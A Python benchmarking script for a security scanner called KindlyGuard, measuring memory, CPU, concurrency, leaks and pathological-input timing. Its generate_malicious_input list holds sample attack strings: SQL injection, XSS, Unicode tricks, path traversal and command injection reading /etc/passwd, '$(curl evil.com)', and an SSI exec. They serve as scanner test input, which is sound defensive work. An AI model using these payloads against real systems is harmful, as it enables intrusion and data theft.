#!/usr/bin/env python3
"""Comprehensive performance analysis for KindlyGuard"""

import json
import subprocess
import time
import psutil
import threading
import random
import string
import os
import sys
from dataclasses import dataclass
from typing import List, Dict, Any
import concurrent.futures
import statistics

@dataclass
class PerformanceMetrics:
    memory_mb: float
    cpu_percent: float
    response_time_ms: float
    throughput_rps: float
    error_count: int

class PerformanceAnalyzer:
    def __init__(self, binary_path: str = "./target/release/kindly-guard"):
        self.binary_path = binary_path
        self.process = None
        self.metrics: List[PerformanceMetrics] = []
        self.monitoring = False
        
    def start_server(self):
        """Start the KindlyGuard server"""
        self.process = subprocess.Popen(
            [self.binary_path, "--stdio"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=0
        )
        time.sleep(2)  # Allow server to initialize
        print(f"Server started with PID: {self.process.pid}")
        
    def stop_server(self):
        """Stop the server gracefully"""
        if self.process:
            self.process.terminate()
            self.process.wait()
            print("Server stopped")
            
    def monitor_resources(self):
        """Monitor CPU and memory usage in a separate thread"""
        psutil_process = psutil.Process(self.process.pid)
        
        while self.monitoring:
            try:
                cpu_percent = psutil_process.cpu_percent(interval=0.1)
                memory_info = psutil_process.memory_info()
                memory_mb = memory_info.rss / 1024 / 1024
                
                # Store current metrics
                if hasattr(self, 'current_metrics'):
                    self.current_metrics.memory_mb = memory_mb
                    self.current_metrics.cpu_percent = cpu_percent
                    
            except psutil.NoSuchProcess:
                break
            time.sleep(0.1)
    
    def generate_large_input(self, size_kb: int) -> str:
        """Generate a large JSON input of specified size"""
        entries = []
        current_size = 0
        target_size = size_kb * 1024
        
        while current_size < target_size:
            entry = {
                "id": f"entry_{len(entries)}",
                "data": ''.join(random.choices(string.ascii_letters + string.digits, k=100)),
                "timestamp": time.time(),
                "nested": {
                    "field1": ''.join(random.choices(string.ascii_letters, k=50)),
                    "field2": random.randint(1, 1000000),
                    "field3": [random.random() for _ in range(10)]
                }
            }
            entries.append(entry)
            current_size = len(json.dumps({"entries": entries}))
        
        return json.dumps({"entries": entries})
    
    def generate_malicious_input(self) -> str:
        """Generate input with various threat patterns"""
        threats = [
            {"text": "admin' OR '1'='1", "type": "sql_injection"},
            {"text": "<script>alert('xss')</script>", "type": "xss"},
            {"text": "Hello\u202EWorld", "type": "unicode_bidi"},
            {"text": "../../../etc/passwd", "type": "path_traversal"},
            {"text": "; cat /etc/passwd", "type": "command_injection"},
            {"text": "user\u200Bname", "type": "unicode_invisible"},
            {"text": "$(curl evil.com)", "type": "command_substitution"},
            {"text": "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->", "type": "ssi_injection"}
        ]
        
        return json.dumps({
            "method": "tools/scan",
            "params": {
                "content": random.choice(threats)
            }
        })
    
    def send_request(self, request_data: str) -> tuple[float, bool]:
        """Send a request and measure response time"""
        start_time = time.time()
        
        try:
            # Send request
            self.process.stdin.write(request_data + "\n")
            self.process.stdin.flush()
            
            # Read response
            response = self.process.stdout.readline()
            
            response_time = (time.time() - start_time) * 1000  # Convert to ms
            return response_time, True
            
        except Exception as e:
            print(f"Request failed: {e}")
            return 0, False
    
    def test_memory_usage(self):
        """Test memory usage with increasing input sizes"""
        print("\n=== Memory Usage Test ===")
        sizes_kb = [1, 10, 100, 500, 1000]
        
        for size_kb in sizes_kb:
            print(f"\nTesting with {size_kb}KB input...")
            
            # Generate large input
            large_input = self.generate_large_input(size_kb)
            
            # Get baseline memory
            psutil_process = psutil.Process(self.process.pid)
            baseline_memory = psutil_process.memory_info().rss / 1024 / 1024
            
            # Send request
            request = json.dumps({
                "method": "tools/scan",
                "params": {"content": large_input}
            })
            
            response_time, success = self.send_request(request)
            
            # Measure memory after processing
            time.sleep(0.5)  # Allow GC to run
            peak_memory = psutil_process.memory_info().rss / 1024 / 1024
            memory_increase = peak_memory - baseline_memory
            
            print(f"  Input size: {size_kb}KB")
            print(f"  Memory increase: {memory_increase:.2f}MB")
            print(f"  Response time: {response_time:.2f}ms")
            print(f"  Success: {success}")
    
    def test_cpu_usage_under_load(self):
        """Test CPU usage under various loads"""
        print("\n=== CPU Usage Under Load Test ===")
        
        # Start resource monitoring
        self.monitoring = True
        monitor_thread = threading.Thread(target=self.monitor_resources)
        monitor_thread.start()
        
        loads = [1, 10, 50, 100]  # Requests per second
        
        for rps in loads:
            print(f"\nTesting at {rps} requests/second...")
            
            cpu_samples = []
            response_times = []
            errors = 0
            
            # Run for 10 seconds
            start_time = time.time()
            request_count = 0
            
            while time.time() - start_time < 10:
                # Generate request
                request = self.generate_malicious_input()
                
                # Send request
                response_time, success = self.send_request(request)
                
                if success:
                    response_times.append(response_time)
                else:
                    errors += 1
                
                request_count += 1
                
                # Collect CPU sample
                if hasattr(self, 'current_metrics'):
                    cpu_samples.append(self.current_metrics.cpu_percent)
                
                # Control request rate
                sleep_time = max(0, (1.0 / rps) - (time.time() - start_time) / request_count)
                if sleep_time > 0:
                    time.sleep(sleep_time)
            
            # Calculate statistics
            avg_cpu = statistics.mean(cpu_samples) if cpu_samples else 0
            avg_response_time = statistics.mean(response_times) if response_times else 0
            p95_response_time = statistics.quantiles(response_times, n=20)[18] if len(response_times) > 20 else max(response_times) if response_times else 0
            
            print(f"  Average CPU usage: {avg_cpu:.1f}%")
            print(f"  Average response time: {avg_response_time:.2f}ms")
            print(f"  95th percentile response time: {p95_response_time:.2f}ms")
            print(f"  Error count: {errors}")
            print(f"  Actual RPS: {request_count / 10:.1f}")
        
        self.monitoring = False
        monitor_thread.join()
    
    def test_concurrent_connections(self):
        """Test handling of concurrent connections"""
        print("\n=== Concurrent Connections Test ===")
        
        concurrent_levels = [10, 50, 100, 200]
        
        for num_concurrent in concurrent_levels:
            print(f"\nTesting with {num_concurrent} concurrent requests...")
            
            # Prepare requests
            requests = [self.generate_malicious_input() for _ in range(num_concurrent)]
            
            # Measure time and send all requests concurrently
            start_time = time.time()
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=num_concurrent) as executor:
                futures = [executor.submit(self.send_request, req) for req in requests]
                results = [f.result() for f in concurrent.futures.as_completed(futures)]
            
            total_time = time.time() - start_time
            
            # Analyze results
            successful = sum(1 for _, success in results if success)
            response_times = [rt for rt, success in results if success and rt > 0]
            
            if response_times:
                avg_response_time = statistics.mean(response_times)
                max_response_time = max(response_times)
            else:
                avg_response_time = 0
                max_response_time = 0
            
            print(f"  Total time: {total_time:.2f}s")
            print(f"  Successful requests: {successful}/{num_concurrent}")
            print(f"  Average response time: {avg_response_time:.2f}ms")
            print(f"  Max response time: {max_response_time:.2f}ms")
            print(f"  Throughput: {successful / total_time:.1f} req/s")
    
    def test_memory_leak(self):
        """Test for memory leaks over extended operation"""
        print("\n=== Memory Leak Test ===")
        print("Running 1000 requests and monitoring memory...")
        
        psutil_process = psutil.Process(self.process.pid)
        memory_samples = []
        
        # Take initial memory reading
        initial_memory = psutil_process.memory_info().rss / 1024 / 1024
        memory_samples.append(initial_memory)
        
        # Run many requests
        for i in range(1000):
            if i % 100 == 0:
                current_memory = psutil_process.memory_info().rss / 1024 / 1024
                memory_samples.append(current_memory)
                print(f"  After {i} requests: {current_memory:.2f}MB (delta: {current_memory - initial_memory:.2f}MB)")
            
            # Mix of small and large requests
            if i % 10 == 0:
                request_data = self.generate_large_input(10)
            else:
                request_data = self.generate_malicious_input()
            
            self.send_request(request_data)
            time.sleep(0.01)  # Small delay between requests
        
        # Final memory reading
        final_memory = psutil_process.memory_info().rss / 1024 / 1024
        memory_increase = final_memory - initial_memory
        
        print(f"\n  Initial memory: {initial_memory:.2f}MB")
        print(f"  Final memory: {final_memory:.2f}MB")
        print(f"  Memory increase: {memory_increase:.2f}MB")
        print(f"  Potential leak: {'YES' if memory_increase > 50 else 'NO'}")
    
    def test_algorithmic_complexity(self):
        """Test algorithmic complexity with pathological inputs"""
        print("\n=== Algorithmic Complexity Test ===")
        
        # Test with deeply nested JSON
        print("\nTesting deeply nested JSON...")
        for depth in [10, 50, 100, 200]:
            # Create deeply nested structure
            nested = {"value": "test"}
            for _ in range(depth):
                nested = {"nested": nested}
            
            request = json.dumps({
                "method": "tools/scan",
                "params": {"content": json.dumps(nested)}
            })
            
            start_time = time.time()
            response_time, success = self.send_request(request)
            
            print(f"  Depth {depth}: {response_time:.2f}ms")
        
        # Test with repetitive patterns
        print("\nTesting repetitive patterns...")
        for count in [100, 1000, 10000]:
            # Create string with many repetitions
            pattern = "a" * count + "b" * count
            request = json.dumps({
                "method": "tools/scan",
                "params": {"content": pattern}
            })
            
            start_time = time.time()
            response_time, success = self.send_request(request)
            
            print(f"  Pattern length {count*2}: {response_time:.2f}ms")
    
    def run_all_tests(self):
        """Run all performance tests"""
        print("Starting KindlyGuard Performance Analysis")
        print("=" * 50)
        
        try:
            self.start_server()
            
            # Run individual tests
            self.test_memory_usage()
            self.test_cpu_usage_under_load()
            self.test_concurrent_connections()
            self.test_memory_leak()
            self.test_algorithmic_complexity()
            
            print("\n" + "=" * 50)
            print("Performance Analysis Complete")
            
        finally:
            self.stop_server()

def main():
    # Check if binary exists
    binary_path = "./target/release/kindly-guard"
    if not os.path.exists(binary_path):
        print(f"Error: Binary not found at {binary_path}")
        print("Please build the project first with: cargo build --release")
        sys.exit(1)
    
    analyzer = PerformanceAnalyzer(binary_path)
    analyzer.run_all_tests()

if __name__ == "__main__":
    main()